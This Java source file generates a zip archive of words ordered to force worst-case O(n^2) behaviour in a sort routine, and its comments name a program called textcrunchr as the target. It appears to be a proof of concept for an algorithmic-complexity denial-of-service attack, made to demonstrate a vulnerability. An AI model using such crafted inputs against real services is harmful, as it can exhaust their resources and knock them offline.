package maliciousInput;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class MaliciousInputCreator {

    /**
     * When this file is run, it produces a zip file that contains a text file with text that demonstrates 
     * a O(n^2) runtime when sorted with changingSort
     */    
    public static void main(String[] args) throws IOException {
        
        // Read the text file with the words to be sorted and put them in an ArrayList
        List<String> list = new ArrayList<String>(65536);
        Scanner sc = new Scanner(new File("sortedLongList.txt"));
        while (sc.hasNextLine()) {
            list.add(sc.nextLine());
        }
        
        // Produce the bad input
        MalSorter<String> sorter = new MalSorter<String>();
        sorter.changingSort(list, 0, list.size() - 1);

        // Produce the appropriate bad file using the input
        createZip(list);

    }

    /**
     * Takes the bad input as a list and creates a zip file that can be used to
     * demonstrate the bad input. This will need to be changed for each host
     * program. Here, it is set up to produce input for textcrunchr.
     */
    private static void createZip(List<String> list) throws IOException {
        // create a zip file
        FileOutputStream fileOut = new FileOutputStream("sortInput.zip");
        ZipOutputStream zipOut = new ZipOutputStream(fileOut);

        // create a text file in the zip file that has the input
        ZipEntry malFile = new ZipEntry("list.txt");
        zipOut.putNextEntry(malFile);
        for (int i = 0; i < list.size(); i++) {
            zipOut.write(list.get(i).getBytes(), 0, list.get(i).length());
            zipOut.write((byte) ' ');
        }
        zipOut.closeEntry();
        zipOut.close();
        fileOut.close();
    }
}
